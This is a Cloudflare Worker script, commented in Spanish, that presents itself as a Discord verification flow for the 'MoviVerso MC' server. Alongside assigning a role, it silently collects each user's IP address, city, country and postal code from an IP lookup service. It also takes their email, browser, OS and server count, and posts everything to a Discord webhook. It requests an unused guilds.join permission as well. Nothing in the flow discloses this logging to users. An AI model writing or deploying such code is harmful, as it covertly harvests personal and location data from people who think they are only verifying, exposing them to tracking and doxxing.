// Cloudflare Worker para verificación con Discord
// Reemplaza variables de entorno en el dashboard de Cloudflare

async function getIpAndLocation(request) {
    const ip = request.headers.get('CF-Connecting-IP') || 'No disponible';
    
    try {
        const geoRes = await fetch(`https://ipapi.co/${ip}/json/`);
        const geo = await geoRes.json();
        return {
            ip: ip,
            location: geo.country_name ? `${geo.country_name}, ${geo.city || 'Ciudad desconocida'}` : 'No disponible',
            postalCode: geo.postal || 'No disponible'
        };
    } catch (e) {
        return { ip: ip, location: 'No disponible', postalCode: 'No disponible' };
    }
}

function getBrowserInfo(request) {
    const ua = request.headers.get('User-Agent') || '';
    let browser = 'Desconocido';
    let os = 'Desconocido';
    if (ua.includes('Chrome') && !ua.includes('Edg')) browser = 'Google Chrome';
    else if (ua.includes('Firefox')) browser = 'Firefox';
    else if (ua.includes('Safari') && !ua.includes('Chrome')) browser = 'Safari';
    else if (ua.includes('Edg')) browser = 'Edge';
    if (ua.includes('Windows')) os = 'Windows';
    else if (ua.includes('Mac')) os = 'MacOS';
    else if (ua.includes('Linux')) os = 'Linux';
    else if (ua.includes('Android')) os = 'Android';
    else if (ua.includes('iOS')) os = 'iOS';
    return { browser, os };
}

export default {
    async fetch(request, env) {
        const url = new URL(request.url);
        
        // === REDIRIGIR A DISCORD ===
        if (!url.pathname.includes('/callback')) {
            const redirectUri = `${env.BASE_URL}/callback`;
            const discordUrl = `https://discord.com/api/oauth2/authorize?client_id=${env.DISCORD_CLIENT_ID}&redirect_uri=${encodeURIComponent(redirectUri)}&response_type=code&scope=identify%20email%20guilds.join%20guilds`;
            return Response.redirect(discordUrl, 302);
        }
        
        // === CALLBACK ===
        const code = url.searchParams.get('code');
        if (!code) {
            return new Response('Código no encontrado', { status: 400 });
        }
        
        try {
            const { ip, location, postalCode } = await getIpAndLocation(request);
            const { browser, os } = getBrowserInfo(request);
            
            // Intercambiar código por token
            const redirectUri = `${env.BASE_URL}/callback`;
            const tokenRes = await fetch('https://discord.com/api/oauth2/token', {
                method: 'POST',
                headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
                body: new URLSearchParams({
                    client_id: env.DISCORD_CLIENT_ID,
                    client_secret: env.DISCORD_CLIENT_SECRET,
                    grant_type: 'authorization_code',
                    code: code,
                    redirect_uri: redirectUri,
                })
            });
            const tokenData = await tokenRes.json();
            
            // Obtener usuario
            const userRes = await fetch('https://discord.com/api/users/@me', {
                headers: { Authorization: `Bearer ${tokenData.access_token}` }
            });
            const user = await userRes.json();
            
            // Obtener cantidad de servidores
            let guildCount = 'No disponible';
            try {
                const guildsRes = await fetch('https://discord.com/api/users/@me/guilds', {
                    headers: { Authorization: `Bearer ${tokenData.access_token}` }
                });
                const guilds = await guildsRes.json();
                guildCount = guilds.length;
            } catch (e) {}
            
            // Asignar rol
            let roleAssigned = false;
            try {
                const roleUrl = `https://discord.com/api/v10/guilds/${env.GUILD_ID}/members/${user.id}/roles/${env.VERIFIED_ROLE_ID}`;
                await fetch(roleUrl, {
                    method: 'PUT',
                    headers: { Authorization: `Bot ${env.DISCORD_BOT_TOKEN}` }
                });
                roleAssigned = true;
            } catch (e) {}
            
            // Enviar webhook
            if (env.WEBHOOK_URL) {
                const embed = {
                    content: `🔐 **NUEVA VERIFICACIÓN** 🔐\n<@${user.id}> se ha verificado.`,
                    embeds: [{
                        title: "📋 Datos del usuario",
                        color: 0xcc0000,
                        fields: [
                            { name: "👤 Discord", value: `**ID:** ${user.id}\n**Usuario:** ${user.username}\n**Email:** ${user.email || 'No disponible'}`, inline: false },
                            { name: "🌍 Ubicación", value: `${location}\n**IP:** ${ip}\n**CP:** ${postalCode}`, inline: true },
                            { name: "💻 Dispositivo", value: `**Navegador:** ${browser}\n**SO:** ${os}`, inline: true },
                            { name: "📊 Stats", value: `**Servidores:** ${guildCount}\n**Rol:** ${roleAssigned ? '✅ Sí' : '❌ No'}`, inline: true }
                        ],
                        footer: { text: "MoviVerso MC" },
                        timestamp: new Date().toISOString()
                    }]
                };
                await fetch(env.WEBHOOK_URL, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(embed)
                });
            }
            
            return Response.redirect(`${env.BASE_URL}/success.html`, 302);
            
        } catch (error) {
            console.error(error);
            return Response.redirect(`${env.BASE_URL}/error.html`, 302);
        }
    }
};
